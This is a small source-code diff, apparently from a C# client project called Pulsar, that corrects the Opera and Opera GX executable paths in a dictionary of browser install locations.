@@ -305,8 +305,8 @@ namespace Pulsar.Client.Messages
                 { "Chrome", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe" },
                 { "Edge", Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Microsoft\\Edge\\Application\\msedge.exe" },
                 { "Brave", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" },
-                { "Opera", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera\\launcher.exe" },
-                { "OperaGX", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera GX\\launcher.exe" },
+                { "Opera", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera\\opera.exe" },
+                { "OperaGX", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera GX\\opera.exe" },
                 { "Mozilla", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\firefox.exe" }
             };
 
